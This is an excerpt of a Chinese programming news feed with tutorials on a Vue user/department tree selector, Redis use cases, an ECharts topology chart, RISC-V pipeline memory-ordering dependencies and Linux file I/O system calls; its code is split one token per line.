form
=
{
deptNames
:
null
,
deptIds
:
null
}
if
(
this
.
checkIf
)
{
form
.
deptNames
=
arr
.
toString
(
)
form
.
deptIds
=
deptIds
.
toString
(
)
this
.
checkIf
=
false
this
.
selectDept
(
form
)
this
.
$refs
.
tree
.
setCheckedKeys
(
[
]
)
;
}
else
{
this
.
checkIf
=
false
this
.
closeDeptTree
(
)
}
}
,
/** 构建树形数据结构 */
getDeptTree
(
)
{
this
.
loading
=
true
listDept
(
)
.
then
(
res
=&gt;
{
this
.
treeData
=
res
.
data
this
.
loading
=
false
}
)
}
,
}
}
;
&lt;/
script
&gt;
&lt;
style
&gt;
&lt;/
style
&gt;
三、控件使用
&lt;
template
&gt;
&lt;
div
&gt;
&lt;
div
&gt;
&lt;
el-form
ref
=
"
form
"
:model
=
"
form
"
:rules
=
"
rules
"
label-width
=
"
90px
"
&gt;
&lt;
el-row
:gutter
=
"
24
"
&gt;
&lt;
el-col
:span
=
"
12
"
&gt;
&lt;
el-form-item
label
=
"
用户1
"
prop
=
"
u1
"
&gt;
&lt;
el-input
v-model
=
"
form.u1Name
"
readonly
@click.native
=
"
handleUser(1)
"
placeholder
=
"
请选择用户1
"
&gt;
&lt;
template
slot
=
"
append
"
&gt;
&lt;
span
class
=
"
inco
"
&gt;
&lt;
i
class
=
"
el-icon-user
"
&gt;
&lt;/
i
&gt;
&lt;/
span
&gt;
&lt;/
template
&gt;
&lt;/
el-input
&gt;
&lt;/
el-form-item
&gt;
&lt;/
el-col
&gt;
&lt;
el-col
:span
=
"
12
"
&gt;
&lt;
el-form-item
label
=
"
部门1
"
prop
=
"
d1Name
"
&gt;
&lt;
el-input
v-model
=
"
form.d1Name
"
readonly
@click.native
=
"
handleDept(1)
"
placeholder
=
"
请输入部门1
"
&gt;
&lt;
template
slot
=
"
append
"
&gt;
&lt;
span
class
=
"
inco
"
&gt;
&lt;
i
class
=
"
el-icon-user
"
&gt;
&lt;/
i
&gt;
&lt;/
span
&gt;
&lt;/
template
&gt;
&lt;/
el-input
&gt;
&lt;/
el-form-item
&gt;
&lt;/
el-col
&gt;
&lt;/
el-row
&gt;
&lt;
el-row
:gutter
=
"
24
"
&gt;
&lt;
el-col
:span
=
"
12
"
&gt;
&lt;
el-form-item
label
=
"
用户2
"
prop
=
"
u2
"
&gt;
&lt;
el-input
v-model
=
"
form.u2Name
"
readonly
@click.native
=
"
handleUser(2)
"
placeholder
=
"
请选择用户2
"
&gt;
&lt;
template
slot
=
"
append
"
&gt;
&lt;
span
class
=
"
inco
"
&gt;
&lt;
i
class
=
"
el-icon-user
"
&gt;
&lt;/
i
&gt;
&lt;/
span
&gt;
&lt;/
template
&gt;
&lt;/
el-input
&gt;
&lt;/
el-form-item
&gt;
&lt;/
el-col
&gt;
&lt;/
el-row
&gt;
&lt;
el-row
:gutter
=
"
24
"
&gt;
&lt;
el-col
:span
=
"
24
"
&gt;
&lt;
el-form-item
label
=
"
用户3
"
prop
=
"
u3
"
&gt;
&lt;
el-input
v-model
=
"
form.u3Name
"
readonly
@click.native
=
"
handleUser(3)
"
type
=
"
text
"
placeholder
=
"
请选择用户3
"
&gt;
&lt;
template
slot
=
"
append
"
&gt;
&lt;
span
class
=
"
inco
"
&gt;
&lt;
i
class
=
"
el-icon-user
"
&gt;
&lt;/
i
&gt;
&lt;/
span
&gt;
&lt;/
template
&gt;
&lt;/
el-input
&gt;
&lt;/
el-form-item
&gt;
&lt;/
el-col
&gt;
&lt;/
el-row
&gt;
&lt;
el-row
:gutter
=
"
24
"
&gt;
&lt;
el-col
:span
=
"
24
"
&gt;
&lt;
el-form-item
label
=
"
用户4
"
prop
=
"
u4
"
&gt;
&lt;
el-input
v-model
=
"
form.u4Name
"
readonly
@click.native
=
"
handleUser(4)
"
placeholder
=
"
请选择用户4
"
&gt;
&lt;
template
slot
=
"
append
"
&gt;
&lt;
span
class
=
"
inco
"
&gt;
&lt;
i
class
=
"
el-icon-user
"
&gt;
&lt;/
i
&gt;
&lt;/
span
&gt;
&lt;/
template
&gt;
&lt;/
el-input
&gt;
&lt;/
el-form-item
&gt;
&lt;/
el-col
&gt;
&lt;/
el-row
&gt;
&lt;/
el-form
&gt;
&lt;/
div
&gt;
&lt;
el-dialog
title
=
"
选择人员
"
:visible.sync
=
"
openUserTree
"
width
=
"
500px
"
append-to-body
&gt;
&lt;
userTree
v-if
=
"
openUserTree
"
:singleSelection
=
"
singleSelection
"
:checkedKeys
=
"
checkedKeys
"
&gt;
&lt;/
userTree
&gt;
&lt;/
el-dialog
&gt;
&lt;
el-dialog
title
=
"
选择部门
"
:visible.sync
=
"
openDeptTree
"
width
=
"
500px
"
append-to-body
&gt;
&lt;
deptTree
:singleSelection
=
"
true
"
:checkedDeptKeys
=
"
checkedDeptKeys
"
&gt;
&lt;/
deptTree
&gt;
&lt;/
el-dialog
&gt;
&lt;/
div
&gt;
&lt;/
template
&gt;
&lt;
script
&gt;
//引用用户选择和部门选择树形控件
import
userTree
from
"/src/components/deptUserTree/userTree.vue"
import
deptTree
from
"/src/components/deptUserTree/deptTree.vue"
export
default
{
name
:
"myPage"
,
components
:
{
userTree
,
deptTree
,
}
,
data
(
)
{
return
{
//用户tree打开
openUserTree
:
false
,
//部门tree打开
openDeptTree
:
false
,
//用户tree数据回显
checkedKeys
:
[
]
,
//部门tree数据回显
checkedDeptKeys
:
[
]
,
// 表单参数
form
:
{
}
,
//选人控件是否单选
singleSelection
:
false
,
}
;
}
,
created
(
)
{
}
,
//父子组件方法触发的关键
provide
(
)
{
return
{
selectUser
:
this
.
selectUser
,
closeUserTree
:
this
.
closeUserTree
,
selectDept
:
this
.
selectDept
,
closeDeptTree
:
this
.
closeDeptTree
,
}
;
}
,
methods
:
{
//点击选人输入框，通过i区分不同的字段的处理
handleUser
(
i
)
{
this
.
userFlag
=
i
this
.
checkedKeys
=
[
]
this
.
singleSelection
=
false
if
(
this
.
userFlag
==
1
)
{
this
.
singleSelection
=
true
if
(
this
.
form
.
u1Name
!=
null
)
{
this
.
checkedKeys
=
this
.
form
.
u1
.
split
(
','
)
}
}
else
if
(
this
.
userFlag
==
2
)
{
this
.
singleSelection
=
true
if
(
this
.
form
.
u2Name
!=
null
)
{
this
.
checkedKeys
=
this
.
form
.
u2
.
split
(
','
)
}
}
else
if
(
this
.
userFlag
==
3
)
{
if
(
this
.
form
.
u3Name
!=
null
)
{
this
.
checkedKeys
=
this
.
form
.
u3
.
split
(
','
)
}
}
else
if
(
this
.
userFlag
==
4
)
{
if
(
this
.
form
.
u4Name
!=
null
)
{
this
.
checkedKeys
=
this
.
form
.
u4
.
split
(
','
)
}
}
//处理数据回显赋值
if
(
this
.
checkedKeys
!=
[
]
)
{
this
.
checkedKeys
.
forEach
(
(
item
,
index
)
=&gt;
{
this
.
checkedKeys
[
index
]
=
"u_"
+
this
.
checkedKeys
[
index
]
}
)
}
this
.
openUserTree
=
true
}
,
//选人确定赋值
selectUser
(
e
)
{
if
(
this
.
userFlag
==
1
)
{
this
.
form
.
u1
=
e
.
userIds
this
.
form
.
u1Name
=
e
.
userNames
}
else
if
(
this
.
userFlag
==
2
)
{
this
.
form
.
u2
=
e
.
userIds
this
.
form
.
u2Name
=
e
.
userNames
//赋值联系方式
this
.
form
.
u2Way
=
e
.
phonenumbers
}
else
if
(
this
.
userFlag
==
3
)
{
this
.
form
.
u3
=
e
.
userIds
this
.
form
.
u3Name
=
e
.
userNames
}
else
if
(
this
.
userFlag
==
4
)
{
this
.
form
.
u4
=
e
.
userIds
this
.
form
.
u4Name
=
e
.
userNames
}
this
.
openUserTree
=
false
}
,
//关闭组件
closeUserTree
(
)
{
this
.
openUserTree
=
false
}
,
//点击选部门输入框
handleDept
(
i
)
{
this
.
deptFlag
=
i
this
.
checkedDeptKeys
=
[
]
if
(
this
.
deptFlag
==
1
)
{
if
(
this
.
form
.
d1Name
!=
null
)
{
//处理部门回显选中的到控件里
this
.
checkedDeptKeys
=
this
.
form
.
d1
.
split
(
','
)
}
}
this
.
openDeptTree
=
true
}
,
//选择部门
selectDept
(
e
)
{
if
(
this
.
deptFlag
==
1
)
{
this
.
form
.
d1
=
e
.
deptIds
this
.
form
.
d1Name
=
e
.
deptNames
}
this
.
openDeptTree
=
false
}
,
//关闭部门选择组件
closeDeptTree
(
)
{
this
.
openDeptTree
=
false
}
,
// 表单重置
reset
(
)
{
this
.
form
=
{
u1
:
null
,
u1Name
:
null
,
u2
:
null
,
u2Name
:
null
,
u3
:
null
,
u3Name
:
null
,
u4
:
null
,
u4Name
:
null
,
d1
:
null
,
d1Name
:
null
,
}
;
this
.
resetForm
(
"form"
)
;
}
,
}
}
;
&lt;/
script
&gt;
&lt;
style
scoped
lang
=
"
scss
"
&gt;
&lt;/
style
&gt;
三、代码分析
自己看代码的注释吧，重点主要是
1、数据结构的构建，获取用户数据和部门数据接口时按照自己的相关字段调整，还有一些数据权限问题按自己需求规避。
2、父子组件方法的调用，因为会存在各种前端标签包裹问题，目前代码只是简单样例，因此采用了provide()来处理。
3、其他应该没有技术难点。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540117.html</guid><pubDate>Fri, 31 Oct 2025 07:24:47 +0000</pubDate></item><item><title>滚雪球学Redis[7.1讲]：Redis实战案例</title><link>https://www.ppmy.cn/news/1540118.html</link><description>全文目录：
🎉前言
🚦1. 使用Redis实现会话管理
在Web应用中使用Redis管理会话
会话过期与刷新策略
安全性考虑与优化
🧩2. 使用Redis实现缓存系统
缓存的基本原理
Redis缓存的应用场景
缓存失效策略与雪崩预防
✨3. Redis在排行榜系统中的应用
使用Sorted Set实现排行榜
动态更新与查询优化
大规模数据下的性能优化
🛠️4. Redis在分布式系统中的应用
Redis在微服务中的应用场景
Redis作为配置中心与服务注册
跨数据中心的Redis应用策略
🚀小结
✨下期预告
🎉前言
在上一期内容【第六章：Redis的高级特性与应用】中，我们深入探讨了Redis的事务、Lua脚本、分布式锁和消息队列等高级功能。这些功能为开发者提供了更强大的工具，使Redis不仅限于键值存储，还能够在复杂业务场景中发挥关键作用。然而，掌握这些高级功能的真正价值在于能够将其应用于实际项目中，解决现实中的问题。
本章将通过几个具体的实战案例，展示如何在实际项目中应用Redis的各种特性。我们将从Web应用中的会话管理、缓存系统的实现、排行榜系统的构建到分布式系统中的应用，全面展示Redis在不同场景下的强大功能和优势。通过这些案例，您将能够更加深入地理解Redis的应用模式，并学会如何在实际开发中充分发挥Redis的潜力。
🚦1. 使用Redis实现会话管理
在Web应用中使用Redis管理会话
在Web应用中，会话管理是一个常见且重要的功能。通常，用户的会话数据需要在多个请求之间保持一致性和连续性。而Redis以其高性能和数据持久化能力，成为管理会话数据的理想选择。
示例：使用Redis实现简单的会话管理
假设我们有一个Web应用，用户登录后需要维护一个会话。可以使用Redis存储用户的会话数据，并设置会话的有效期。
import
redis
from
flask
import
Flask
,
session
,
redirect
,
url_for
,
requestapp
=
Flask
(
__name__
)
app
.
secret_key
=
'supersecretkey'
r
=
redis
.
StrictRedis
(
host
=
'localhost'
,
port
=
6379
,
db
=
0
)
@app
.
route
(
'/login'
,
methods
=
[
'POST'
]
)
def
login
(
)
:
session_id
=
request
.
form
[
'session_id'
]
user_data
=
{
'username'
:
request
.
form
[
'username'
]
}
r
.
hmset
(
session_id
,
user_data
)
r
.
expire
(
session_id
,
3600
)
# 设置会话过期时间为1小时
session
[
'session_id'
]
=
session_id
return
redirect
(
url_for
(
'profile'
)
)
@app
.
route
(
'/profile'
)
def
profile
(
)
:
session_id
=
session
.
get
(
'session_id'
)
if
session_id
and
r
.
exists
(
session_id
)
:
user_data
=
r
.
hgetall
(
session_id
)
return
f"Welcome
{
user_data
[
'username'
]
.
decode
(
)
}
!"
else
:
return
"Session expired, please login again."
,
403
if
__name__
==
'__main__'
:
app
.
run
(
debug
=
True
)
在这个示例中，用户登录后，我们将会话数据存储在Redis中，并设置了一个小时的过期时间。每次请求时，应用会检查Redis中是否存在有效的会话数据，确保用户会话的连续性。
会话过期与刷新策略
会话过期时间是会话管理中的一个关键参数。为了避免用户频繁登录或会话过期，可以在用户每次活动时刷新会话过期时间。例如，在用户每次请求时，更新Redis中的过期时间：
r
.
expire
(
session_id
,
3600
)
# 刷新会话过期时间
这种策略可以确保用户在持续活动时不会因会话过期而被迫重新登录，提升用户体验。
安全性考虑与优化
在实际应用中，安全性是会话管理的重要考虑因素。使用Redis进行会话管理时，应注意以下几点：
防止会话劫持
：
使用
HTTPS
加密传输，确保会话ID不被窃取。
在Redis中存储的会话数据应进行加密或签名，防止数据被篡改。
限制会话并发数
：
可以在Redis中记录用户的会话数量，限制单个用户同时活跃的会话数量，防止恶意行为。
审计与监控
：
定期审计会话数据，并通过Redis的监控工具跟踪会话的使用情况，确保系统安全。
🧩2. 使用Redis实现缓存系统
缓存的基本原理
缓存是一种用于提高数据读取速度的机制，通常用于减少对数据库或其他慢速数据源的访问频率。Redis作为一个高性能的内存数据库，常用于构建缓存系统。通过将热点数据存储在Redis中，应用可以大幅降低数据库的负载，并提高响应速度。
Redis缓存的应用场景
Redis缓存的应用场景非常广泛，包括：
页面缓存
：
将动态生成的页面内容缓存到Redis中，减少Web服务器的计算压力。
数据库查询结果缓存
：
将频繁查询的数据库结果缓存到Redis中，减少数据库查询次数。
API响应缓存
：
将API的响应结果缓存，减少重复计算或远程调用。
缓存失效策略与雪崩预防
在使用缓存时，缓存失效和雪崩是两个需要重点关注的问题。
缓存失效策略
：
设置合适的过期时间，防止缓存数据过期后带来的一次性查询压力。可以使用
SET
命令的
EX
选项设置过期时间：
SET mykey
"value"
EX
3600
# 缓存1小时
缓存雪崩预防
：
缓存雪崩指的是大量缓存数据在同一时间失效，导致数据库瞬间承受巨大的查询压力。可以通过设置不同的过期时间或添加随机延迟来平滑缓存失效时间，减少雪崩的可能性。
示例：实现简单的数据库查询缓存
def
get_user_profile
(
user_id
)
:
cached_profile
=
r
.
get
(
f"user_profile:
{
user_id
}
"
)
if
cached_profile
:
return
cached_profile
.
decode
(
)
# 假设这是一个从数据库获取用户信息的操作
user_profile
=
database
.
get_user_profile
(
user_id
)
r
.
set
(
f"user_profile:
{
user_id
}
"
,
user_profile
,
ex
=
3600
)
return
user_profile
在这个示例中，用户资料首先从Redis缓存中获取，如果缓存不存在，则从数据库查询并缓存结果。
✨3. Redis在排行榜系统中的应用
使用Sorted Set实现排行榜
Redis的
Sorted Set
（有序集合）是实现排行榜的理想数据结构。
Sorted Set
中的元素是有序的，每个元素关联一个分数，Redis会根据分数自动对元素进行排序。这种特性使其非常适合实现排行榜系统。
示例：实现简单的游戏排行榜
# 添加玩家分数
r
.
zadd
(
'leaderboard'
,
{
'player1'
:
1000
,
'player2'
:
2000
,
'player3'
:
1500
}
)
# 获取排行榜前3名
top_players
=
r
.
zrevrange
(
'leaderboard'
,
0
,
2
,
withscores
=
True
)
print
(
top_players
)
# 输出：[('player2', 2000), ('player3', 1500), ('player1', 1000)]
在这个示例中，我们使用
ZADD
命令将玩家和他们的分数添加到排行榜中，然后通过
ZREVRANGE
命令按分数从高到低获取前3名玩家。
动态更新与查询优化
在实际应用中，排行榜数据需要动态更新和实时查询。Redis提供了一些命令来支持这些操作：
动态更新分数
：
使用
ZINCRBY
命令可以动态更新某个玩家的分数：
ZINCRBY leaderboard
50
player1
# player1的分数增加50
查询排名
：
使用
ZRANK
命令可以查询某个玩家的当前排名：
rank
=
r.zrevrank
(
'leaderboard'
,
'player1'
)
print
(
rank
)
# 输出玩家的当前排名
大规模数据下的性能优化
当排行榜数据量较大时，需要采取一些优化措施来确保Redis的性能：
分片存储
：
将排行榜数据分片存储在多个Redis实例中，减少单个实例的负载。
异步更新
：
对于更新频繁的排行榜，可以考虑异步更新分数，将更新操作分批处理，减少瞬时写入压力。
定期清理
：
定期清理过期或不活跃的玩家数据，减少排行榜的大小，提升查询性能。
🛠️4. Redis在分布式系统中的应用
Redis在微服务中的应用场景
在微服务架构中，Redis常被用作缓存、消息队列、分布式锁和会话管理工具。其高性能和灵活性使其成为微服务间通信和数据共享的理想选择。
共享缓存
：
Redis可以作为多个微服务间的共享缓存，存储公共数据，如配置文件、访问令牌等。
分布式锁管理
：
使用Redis实现分布式锁，确保在分布
式环境中，只有一个微服务实例可以执行某个关键操作。
会话管理
：
在微服务中，用户的会话数据可以统一存储在Redis中，实现跨服务的会话共享。
Redis作为配置中心与服务注册
Redis还可以用作配置中心，存储和管理微服务的配置信息。在某些情况下，Redis也可以作为轻量级的服务注册中心，存储微服务的地址和状态信息。
示例：使用Redis存储微服务配置信息
# 存储配置信息
r
.
hset
(
'service:config'
,
'timeout'
,
30
)
r
.
hset
(
'service:config'
,
'retries'
,
5
)
# 获取配置信息
timeout
=
r
.
hget
(
'service:config'
,
'timeout'
)
retries
=
r
.
hget
(
'service:config'
,
'retries'
)
print
(
f"Timeout:
{
timeout
}
, Retries:
{
retries
}
"
)
在这个示例中，微服务的配置信息存储在Redis的哈希表中，可以随时读取或更新。
跨数据中心的Redis应用策略
在跨数据中心的应用场景中，Redis的使用需要特别注意数据一致性和延迟问题。常见的策略包括：
主从复制
：
使用Redis的主从复制功能，将数据从一个数据中心同步到另一个数据中心。
多主架构
：
为了提高可靠性，可以在多个数据中心部署Redis主节点，通过一致性算法确保数据同步。
数据分片与路由
：
将不同的数据分片存储在不同的数据中心，并通过智能路由机制确保数据的快速访问。
🚀小结
本章通过一系列实战案例，展示了Redis在会话管理、缓存系统、排行榜以及分布式系统中的应用。这些案例不仅涵盖了Redis的基本功能，还深入探讨了如何在大规模、高并发环境下优化Redis的使用。通过这些案例，您可以更好地理解Redis的应用模式，并学会如何在实际开发中充分利用Redis的强大功能。
✨下期预告
在下期内容【第八章：Redis的扩展与未来发展】中，我们将探讨Redis的扩展能力和未来发展趋势。我们将介绍Redis Modules的使用，以及Redis在云计算、大数据和人工智能等领域的应用前景。通过这些内容，您将能够了解Redis在未来技术趋势中的定位，并探索Redis更多的应用可能性。敬请期待！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540118.html</guid><pubDate>Fri, 31 Oct 2025 07:24:49 +0000</pubDate></item><item><title>echarts 括扑图（graph 与 lines实现）</title><link>https://www.ppmy.cn/news/1540119.html</link><description>目的
要实现一个由几条线串起来的设备，线是动态的，如下
相关技术
vue,echarts
难点
因为用到了两种图，要保持坐标系一致性，graph设置coordinateSystem: ‘cartesian2d’,后不能使用x,y要使用value，(这一点官网没有说)
代码
&lt;script setup&gt;
import { ref } from 'vue'
import MyEcharts from '@/components/myEcharts/index.vue'
import symbol_img_1 from '../../assets/image/test/配电柜.svg'const opt = ref(null)
opt.value = {title: {text: '巡检图'},xAxis: {show: false,type: 'value',min: 0,max: 100},yAxis: {show: false,type: 'value',min: 0,max: 100},tooltip: {},animationDurationUpdate: 1500, // 数据更新动画的时长，单位 ms，默认 300animationEasingUpdate: 'quinticInOut', // 数据更新动画的缓动效果，默认 'cubicOut'series: [{type: 'graph',coordinateSystem: 'cartesian2d',layout: 'none', // 图的布局 none：不采用任何布局symbol: `image://${symbol_img_1}`, // 节点标记的图形symbolSize: 100, // 节点大小，可以设置数组表示宽高roam: false, // 是否可以平移缩放label: {show: true //是否显示标签},edgeSymbol: ['circle', 'arrow'], // 边两端的类型edgeSymbolSize: [4, 10], // 边两端的大小，可以设置数组表示宽高edgeLabel: {// 边的文本标签fontSize: 20},data: [{name: 'Node 1',value: [20, 50]},{name: 'Node 2',value: [50, 50]},{name: 'Node 3',value: [80, 50]},{name: 'Node 4',value: [80, 80]}],links: [// {//   source: 'Node 1',//   target: 'Node 2',//   symbolSize: [10, 20],//   label: {//     show: false//   },//   lineStyle: {//     width: 5,//     color: 'rgba(15, 117, 148, 1)',//     type: 'dashed',//     dashOffset: 5, // 虚线偏移量//     curveness: 0 // 0-1 之间的数值，表示曲度，值越大曲度越大//   }// }]},{type: 'lines',polyline: true, // 是否为多线段coordinateSystem: 'cartesian2d', // 坐标系类型lineStyle: {type: 'solid',width: 8,color: 'rgba(5, 98, 96, 1)'},effect: {period: 3, // 动画时间show: true,trailLength: 0, // 尾迹长度symbol: 'rect',color: 'rgba(0, 217,163, 1)',loop: true,symbolSize: [3, 10]},data: [{coords: [[20, 50],[50, 50]]},{coords: [[50, 50],[80, 50]]},{coords: [[80, 50],[80, 80]]}]}]
}
&lt;/script&gt;</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540119.html</guid><pubDate>Fri, 31 Oct 2025 07:24:51 +0000</pubDate></item><item><title>RISC-V笔记——Pipeline依赖</title><link>https://www.ppmy.cn/news/1540120.html</link><description>1. 前言
RISC-V的RVWMO模型主要包含了preserved program order、load value axiom、atomicity axiom、progress axiom和I/O Ordering。今天主要记录下preserved program order(保留程序顺序)中的Pipeline Dependencies(Pipeline依赖)。
2. Pipeline依赖
Pipeline依赖指的是：
a操作在程序顺序中先于b操作，a和b都访问常规主存，不是I/O区域，如果存在以下任何一个条件，那么a操作和b操作在全局内存顺序中的顺序也不会变。
b是load，在a和b程序顺序之间存在一个store m，m的地址或数据依赖于a，b返回的值是m写的值。
b是store，在a和b程序顺序之间存在一些指令m，m的地址依赖于a。
这两点几乎在所有真实处理器pipeline上都存在的。
关于第一点，
是想表明如果old的store的地址或数据还未知的话，load是不能从store转发数据的。也就是必须等a确定执行完之后，得到了m的地址或数据了，才会执行b，所以a和b的全局顺序肯定是保证的。如下图所示。
(f)在(e)的数据确定之前是不能被执行的，因为(f)必须返回(e)写的值，并且在(d)有机会执行之前，旧的值不能被(e)的回写所破坏，因此，(f)将不会在(d)之前执行，也就是它们俩的顺序是固定的。
关于第二点，
它与第一点规则有着类似的观察：在可能访问同一地址的所有older load被执行之前，store不能在memory中确定执行。因为store如果提前执行的话，那么旧的值被覆盖了，那么older的load就无法读取到了。同样的，除非知道前面的指令不会由于地址解析失败而导致异常，都则通常不能执行store操作，从这个意义上说，这个一点是之前语法依赖里的控制依赖的某种特殊情况。如下图所示。
在(e)的地址被解析完之前，(f)不能执行，因为结果可能是地址匹配，也就是a1等于0。因此，在(d)被执行并确认(e)地址是否确实重叠之前，(f)不能被发到内存去执行的，也就是(d)和(f)的顺序是固定的。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540120.html</guid><pubDate>Fri, 31 Oct 2025 07:24:52 +0000</pubDate></item><item><title>Linux·文件与IO</title><link>https://www.ppmy.cn/news/1540121.html</link><description>1. 回忆文件操作相关知识
我们首先回忆一下关于文件的一些知识。
如果一个文件没有内容，那它到底有没有再磁盘中存在？答案是存在，因为
文件 = 内容 + 属性
，即使文件内容为空，但属性信息也是要记录的。就像进程的组成是代码和数据 + PCB一样。
下面看一段经典的文件操作的代码，回忆一下文件操作的函数。
这是向文件 log.txt 中写入5行 hello file ，如果当前工作目录没有log.txt那就新建一个。
我们发现如果我们想对一个文件进行读写操作，首先就要打开文件，那为什么要先打开文件，打开文件到底是在干什么呢？
我们知道文件是在机器的磁盘上存储的，但是对文件进行操作的却是在进程当中，而进程的所有信息都应该在内存上存储的，也就是说如果想操作文件就要把它加载到内存中通过进程去操作，而
加载内存这一行为在代码上的表现就是fopen
。
文件被加载到内存之后肯定也要被OS管理起来，也就是文件也要被
先表述再组织
，具体来说，在内存中文件肯定被OS用
文件的内核结构+文件的内容
挂起来再用数据结构串起来，便于之后进程对文件进行操作，也就是说我们研究文件操作，就是在研究文件和进程的关系。
文件有两种：1. 被打开的文件(在内存中)    2. 没被打开的文件(在磁盘中)    这两种文件我们后面都要研究。
fopen函数
选项 r：只读打开文件，从文件开头处开始
选项 r+：读写打开文件，从文件开头处开始
选项 w：将文件截断(清空)，若不存在则新建文件，从文件开头处开始
选项 w+：读写打开文件，将文件截断(清空)，若不存在则新建文件，从文件开头处开始
选项 a(append)：向文件追加，如果不存在则新建文件，从文件末尾处开始
选项 a+：读写打开，如果不存在则新建文件，读从文件开头处开始，写从文件末尾处开始
在此我们回忆一下关于输出重定向的内容
符号 &gt; 就相当于选项 w 打开文件，符号 &gt;&gt; 就相当于选项 a 打开文件
关于文件操作的更多内容
C语言·文件操作-CSDN博客
文章浏览阅读1k次，点赞25次，收藏21次。本文详细讲解了C++中文件的概念、不同类型文件（程序文件、数据文件），以及二进制文件和文本文件的区别。涉及文件的打开、关闭、流（包括标准流和文件指针）、顺序读写、随机读写（如fseek、ftell、rewind）以及文件结束判定（feof、ferror）。还介绍了文件缓冲区的工作原理。
https://blog.csdn.net/atlanteep/article/details/134894644?spm=1001.2014.3001.5502
关于输出/输入重定向的更多内容
Linux·基本指令(下)-CSDN博客
文章浏览阅读971次，点赞22次，收藏21次。本节讲解了剩余的一些指令，有mv、cat、重定向的&gt; &gt;&gt; &lt; 、less按页查看、head tail 管道| 、date、cal日历、find、which、alias指令别名、zip unzip tar压缩解压、sz rz操作系统间传文件、bc计算器、uname -r/-a 查询机器相关参数、shutdown
https://blog.csdn.net/atlanteep/article/details/138714286?spm=1001.2014.3001.5502
任何一个
进程
在启动的时候都
默认要启动三个输入输出流
，分别是
stdin(标准输入) stdout(标准输出) stderr(标准错误)
。这三个文件流对应的设备分别是键盘、显示器、显示器，我们又知道Linux下一切皆文件，因此这三个设备其实就是三个文件，它们有对应的文件流也是合理操作。
到目前为止我们学过的打印到显示器的方法有如下四种
这些都是C语言提前给我们封装好的文件操作接口，并不是系统层面上的接口，接下来我们看看系统级别的文件操作函数。
2. 文件操作系统接口
2.1 open
2.1.1 参数
第一个参数
pathname
一个字符串，可以选择带或不带路径的文件名，不带路径的话就只能打开当前工作路径的文件。
第二个参数
flags
标记位，常见的标记位一共有5个
O_RDONLY(只读)    O_RDONLY(只写)    O_RDWR(读写)    O_CREAT(创建)  O_APPEND(追加)
O_TRUNC(清空)
这5个标记位都是宏，它们之间是可以随意组合的。组合的目的就是一次性传递更多信息，而实现的方法就是
flag 是一32位的位图
，每一个比特位都代表一个开关。
这五个标记位每人对应一个比特位，将它们
按位或
也就是将它们组合，最后的结果给到位图flag分析，通过每一位上的1和0标记出某一个功能的开启或关闭。
第三个参数
mode
设置权限。系统接口没有默认权限这一说的，因此我们在
O_CREAT
创建文件的时候，一定要带上第三个参数来设定好权限，否则权限就会出现乱码。而
mode的值就是权限码
，当然这个值后来会被
权限掩码
所影响。
关于文件的权限，权限码，权限掩码是什么参考：
Linux·权限与工具(上)-CSDN博客
文章浏览阅读798次，点赞22次，收藏21次。本节讲解了，shell操作系统的外壳程序是什么，Linux中怎么设置删除用户，文件和目录的权限属性：读写可执行，拥有者拥有组其他人，以及如何修改这些参数，umask权限掩码是什么，粘滞位t是什么权限
https://blog.csdn.net/atlanteep/article/details/140466975?spm=1001.2014.3001.5502
真实权限码 = 设置权限码 &amp; umask按位取反
下面我们实操一下
可以看到我们设置的权限码虽然是 0666 但是因为权限掩码是 0002 因此最后表现出来的真实权限码就是 0664 ，这个666前面必须要有
0表示这是一个八进制数
。
如果不想让OS使用权限掩码影响我们对文件权限的表述
可以在代码中使用
umask()
接口更改权限掩码
可以看到文件的权限变成了666 ，因为这个程序是在
子进程
中跑的，因此更改的umask并没有影响到shell上的umask值。
2.1.2 返回值
我们前面看到open函数的返回值是int类型的数字
打开失败返回 -1
打开成功返回descriptor(文件描述符)，跳转到 2.2 close 看看文件描述符是什么
2.2 close
man 2 close查询
通过文件描述符关闭某个文件。
我们这里直接说结论
fd就是数组的下标
，这个数组是让进程数据结构和文件数据结构产生关联的一张表(文件描述符表)。
我们使用open多次打开多个文件之后会发现这样一个现象：
三个默认启动的输入输出流也都有各自对应的硬件文件，但因为它们是默认启动的，因此它们的fd是固定的0、1、2
stdin对应标准输入匹配是键盘文件，fd=0
stdout对应标准输出显示器文件，fd=1
stderror对应标准错误显示器文件，fd=2
之后再打开的文件直接pushback到数组结尾，也就是从fd=3开始依次增加。
最后我们说一下出现这种现象的原理，以及fd所在的表到底是什么
当文件被加载进内存之后并不是在进程模块中，而是自成一派。由file结构体存储文件的打开信息，就像PCB一样，加载一个进程进来就用链表穿起来，最后组织成一个链表file list
那进程和文件又是如何耦合起来的呢？
PCB中有一个指向 file_struct结构体 的 指针files，这个结构体中有一个非常重要的指针数组 fd_array[ ]
文件描述符表
，文件描述符表中每个元素指向在该进程中打开的文件结构体地址，因此这个数组的下标就是所谓的 fd ，因为三个文件读写流是默认启动的，因此这个数组的前三项总是它们，也就是0、1、2总对应着这三个流
2.3 write
man 2 write查询
w w+ 式写入
​​​​​​​
​​​​​​​
O_TRUNC控制每次打开先截断文件。
这里write写入文件的时候不要把字符串的\0也写进去，因为这个字符串结束符是C语言定义的，文件不认，因此只要把干干净净的字符串送进文件中就行。
a a+ 式写入
​​​​​​​
2.4 read
man 2 read查询
··
把fd文件中的内容读到buf中去，期望读到的字节数位count，最多能读count个数据
返回值是实际读到的字节数，sssize_t就是有符号的整数
​​​​​​​        ​​​​​​​        ​​​​​​​
这段代码的功能就是从标准输入流也就是键盘中读取数据到buffer数组中。
3. VFS虚拟文件系统
VFS(virtual file system) 虚拟文件系统，是使用函数指针的方法屏蔽底层不同硬件操作上的差异的方法。也是我们所说Linux下一切皆文件的核心思路，下面我们看看这个VFS到底是怎么实现一切皆文件的。
首先每个硬件都由自己的驱动把自己的信息加载到OS中的device结构体中，但是每个硬件的读写方法是不一样的，但这都不是问题。在VFS虚拟文件系思路中，将为硬件也创建 file文件结构体 这个结构体中包括了 read 和 write 函数指针，指向对应硬件的读写方式。此时就可以调用read write函数调用到对应的硬件读写方法，从而完成对硬件的读写。
通过虚拟文件系统的思路将硬件模拟成文件，然后将硬件的操作方法映射到文件的操作函数上，此时就可以通过操作文件的方法操作硬件了，使用函数指针屏蔽底层不同硬件操作上的差异。这就是
Linux下一切皆文件
的实现方案。
